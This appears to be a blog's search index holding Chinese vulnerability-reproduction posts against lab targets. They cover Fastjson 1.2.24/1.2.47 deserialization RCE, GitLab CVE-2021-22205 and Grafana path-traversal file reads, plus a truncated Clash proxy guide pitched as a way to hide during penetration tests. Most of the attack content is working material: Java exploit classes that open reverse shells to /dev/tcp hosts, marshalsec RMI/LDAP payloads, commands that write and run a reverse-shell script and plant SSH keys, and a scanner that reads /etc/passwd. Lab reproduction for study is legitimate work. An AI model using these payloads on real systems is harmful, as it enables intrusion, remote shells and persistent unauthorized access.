<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fastjson 1.2.47 远程命令执行漏洞</title>
      <link href="/2021/12/20/Fastjson1-2-47%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/12/20/Fastjson1-2-47%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>Fastjson 1.2.47的利用方式和和1.2.24的利用方式相似，如果没有复现过1.2.24的推荐看一下我上一篇文章。</p><span id="more"></span><h3 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h3><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p>靶机环境：<code>vulhub-fastjson-1.2.47</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/fastjson/1.2.47-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h3><p><code>fastjson &lt;= 1.2.47</code></p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h3><p>访问页面如下：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220143650967.png" alt="image-20211220143650967"></p><h4 id="RMI利用方式"><a href="#RMI利用方式" class="headerlink" title="RMI利用方式"></a>RMI利用方式</h4><p>攻击脚本，反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/10.1.3.145/8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下脚本<code>javac Exploit.java</code>，执行完后，会出现一个<code>Exploit.class</code>的文件。</p><p>本地启动一个HTTP服务，使用marshalsec启动RMI服务，监听8001端口远程加载<code>Exploit.class</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8001</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220144240290.png" alt="image-20211220144240290"></p><p>本地监听一下8888端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><p>开始攻击,payload如下，注意是以POST方式提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.47.156:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://10.1.3.145:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220144535178.png" alt="image-20211220144535178" style="zoom: 67%;" /><p>查看RMI端记录</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220144613573.png" alt="image-20211220144613573"></p><p>监听端</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220144649250.png" alt="image-20211220144649250"></p><h4 id="LDAP利用方式"><a href="#LDAP利用方式" class="headerlink" title="LDAP利用方式"></a>LDAP利用方式</h4><p>前面都一样，就marshalsec部分和数据包需要修改一下。这里启动的是LDAP服务，前面的是RMI服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8001</span><br></pre></td></tr></table></figure><p>然后数据包修改成LDAP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.47.156:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://10.1.3.145:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后和前面一样都弄好以后，发送数据包</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211220145327496.png" alt="image-20211220145327496"></p><p>LDAP端记录</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220145232707.png" alt="image-20211220145232707"></p><p>监听端</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220145302931.png" alt="image-20211220145302931"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><ul><li><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></li><li><a href="https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce">https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1-2-24 远程命令执行漏洞</title>
      <link href="/2021/12/20/Fastjson1-2-24%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/12/20/Fastjson1-2-24%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>刚好今天复现一下Fastjson漏洞。</p><span id="more"></span><h3 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h3><p>fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><h3 id="0x02环境搭建"><a href="#0x02环境搭建" class="headerlink" title="0x02环境搭建"></a>0x02环境搭建</h3><p>靶机环境：<code>vulhub-fastjson-1.2.24</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/fastjson/1.2.24-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h3><p><code>fastjson &lt;= 1.2.24</code></p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h3><p>访问页面如下:</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220112430234.png" alt="image-20211220112430234"></p><h4 id="RMI利用方式"><a href="#RMI利用方式" class="headerlink" title="RMI利用方式"></a>RMI利用方式</h4><p>攻击脚本，将shell反弹到攻击机上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/10.1.3.145/8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下脚本<code>javac Exploit.java</code>，执行完后，会出现一个<code>Exploit.class</code>的文件。</p><p>之后需要下载marshalsec项目，然后进行编译。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mbechler/marshalsec</span><br></pre></td></tr></table></figure><p>本地启动一个HTTP服务，使用marshalsec启动RMI服务，监听8001端口远程加载<code>Exploit.class</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8001</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220132820265.png" alt="image-20211220132820265"></p><p>然后开启监听8888端口：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220132341652.png" alt="image-20211220132341652"></p><p>开始攻击,payload如下，注意是以POST方式提交：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host:192.168.47.156:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;naraku&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://10.1.3.145:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看RMI端的记录</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220133956763.png" alt="image-20211220133956763"></p><p>查看监听部分：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220134016118.png" alt="image-20211220134016118"></p><p>成功返回了shell。</p><h4 id="LDAP利用方式"><a href="#LDAP利用方式" class="headerlink" title="LDAP利用方式"></a>LDAP利用方式</h4><p>前面的基本都一样，唯一不一样的地方在marshalsec项目这里。</p><p>这里启动的不是RMI服务，而是LDAP服务，监听端口换成8002了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://10.1.3.145:1234/#Exploit&quot; 8002</span><br></pre></td></tr></table></figure><p>在burp端发起payload，payload如下，依旧注意是POST请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host:192.168.47.156:8090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;naraku&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://10.1.3.145:8002/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220135014091.png" alt="image-20211220135014091"></p><p>LDAP端记录：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220134956709.png" alt="image-20211220134956709"></p><p>监听部分：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211220135048010.png" alt="image-20211220135048010"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><ul><li><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></li><li><a href="https://www.wangan.com/docs/342">https://www.wangan.com/docs/342</a></li><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitLab未授权RCE</title>
      <link href="/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/"/>
      <url>/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</url>
      
        <content type="html"><![CDATA[<p>本来早该复现完的，中间因为太多事情耽误了。</p><span id="more"></span><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01.漏洞介绍"></a>0x01.漏洞介绍</h3><p>GitLab是美国GitLab公司的一款使用Ruby on Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。 由于 GitLab 没有正确验证传递给文件解析器的图像文件，攻击者可利用该漏洞在服务端进行远程命令执行。</p><h3 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h3><p><code>11.9 &lt;=  GitLab（CE/EE）&lt; 13.8.8</code><br><code>13.9 &lt;=  GitLab（CE/EE）&lt; 13.9.6</code><br><code>13.10 &lt;= GitLab（CE/EE）&lt; 13.10.3</code></p><h3 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03.环境搭建"></a>0x03.环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/gitlab/CVE-2021-22205/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:8080</code>即可。</p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h3><h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Al1ex/CVE-2021-22205</span><br></pre></td></tr></table></figure><h4 id="探测漏洞是否存在"><a href="#探测漏洞是否存在" class="headerlink" title="探测漏洞是否存在"></a>探测漏洞是否存在</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-22205.py -v true -t http://192.168.47.156:8080/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216104712547.png" alt="image-20211216104712547"></p><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;curl http://10.1.3.91:1234/1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216105224401.png" alt="image-20211216105224401"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#写入shell</span><br><span class="line">python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/10.1.3.91/6666 0&gt;</span><br><span class="line">&amp;1&#x27; &gt; /tmp/1.sh&quot;</span><br><span class="line">#赋予shell脚本执行权限</span><br><span class="line">py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;chmod +x /tmp/1.sh&quot;</span><br><span class="line">#服务器监听6666端口</span><br><span class="line">nc64.exe -lvnp  6666</span><br><span class="line">#获取git权限</span><br><span class="line">py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;/bin/bash /tmp/1.sh&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174619254.png" alt="image-20211216174619254"></p><p>执行完命令后，成功上线。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174715381.png" alt="image-20211216174715381"></p><p>可以看到我们创建的1.sh也在。</p><h4 id="ssh公钥登录"><a href="#ssh公钥登录" class="headerlink" title="ssh公钥登录"></a>ssh公钥登录</h4><p>通过<code>cat /etc/passwd</code>可以发现git用户可以远程ssh登录。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216182818722.png" alt="image-20211216182818722"></p><p>我们将公钥写到目标机器上进行登录。</p><p>本地生成一下ssh公钥，输入<code>ssh-keygen</code>然后一路回车就OK了。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216183027591.png" alt="image-20211216183027591"></p><p>之后利用我们之前反弹获取到的shell，将公钥下载到目标机器上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.1.3.91:1234/gitlab_git.pub</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217140517410.png" alt="image-20211217140517410"></p><p>默认情况下git用户的authorized_keys内容为空，如果存在内容的话，先备份一下，再写入。这里要注意的是<code>authorized_keys</code>是在用户下的.ssh目录下。</p><p>写入成功后进行ssh登录即可。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217142208397.png" alt="image-20211217142208397"></p><p>后续本来想要手工再利用的，没有账号密码！！！。</p>]]></content>
      
      
      
        <tags>
            
            <tag> GitLab </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Grafana任意文件读取</title>
      <link href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>最近Grafana爆出了任意文件读取，这里刚好复现一波</p><span id="more"></span><h3 id="什么是Grafana"><a href="#什么是Grafana" class="headerlink" title="什么是Grafana"></a>什么是Grafana</h3><p>Grafana是一款用Go语言开发的开源数据可视化工具，可以做数据监控和数据统计，带有告警功能。目前使用grafana的公司有很多，如paypal、ebay、intel等。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Grafana            8.x</code></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/public/plugins/插件名称/../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211208094520066.png" alt="image-20211208094520066"></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">args = str(sys.argv[1])</span><br><span class="line">f = open(&quot;./paload.txt&quot;)</span><br><span class="line">for line in f:</span><br><span class="line">    url = &quot;http://&quot;+args+&quot;/public/plugins/&quot;+str.rstrip(line)+&quot;/../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False)</span><br><span class="line">    a=req.text</span><br><span class="line">    str1=&#x27;root&#x27;</span><br><span class="line">    if a in str1:</span><br><span class="line">        print(&#x27;确认存在&#x27;+str.rstrip(line)+&#x27;路径,并存在漏洞!&#x27;)</span><br><span class="line">        print(url)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;不存在漏洞!&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211208095615231.png" alt="image-20211208095615231"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Grafana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash配置TUN模式</title>
      <link href="/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>Clash默认配置只会配置系统代理，这样只有浏览器的流量是走的代理，而其他一些软件或者是命令行是不走代理的，这对渗透测试过程中想要更好的隐藏自己十分的不方便，而Clash的TUN模式可以实现全流量的代理。😊😊</p><span id="more"></span><h3 id="TUN模式配置"><a href="#TUN模式配置" class="headerlink" title="TUN模式配置"></a>TUN模式配置</h3><p>从<code>Clash v0.17.2</code>开始，我们就不需要自己去下载wintun.dll文件了。现在，我们只需要打开Clash。</p><ol><li>点击<code>General</code>中<code>Service Mode</code>右边的<code>Manage</code>。在打开的窗口安装服务模式，安装完成后会自动重启，只要<code>Service Mode</code>右边的地球变成绿色的，就代表安装成功了。</li><li>进入<code>Settings页面</code> <strong>&gt;</strong> <code>Profile Mixin</code> <strong>&gt;</strong> <code>YAML</code> <strong>&gt;</strong> <code>Edit</code></li><li>返回<code>general</code>页面开启<code>Mixin</code>即可</li></ol><p>这里需要注意的是如果你在配置之前需要将<code>general</code>页面的<code>Mixin</code>关闭，如果没有关闭就配置完了，需要在配置完成后进行重启Clash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mixin: # object</span><br><span class="line">  dns:</span><br><span class="line">    enable: true</span><br><span class="line">    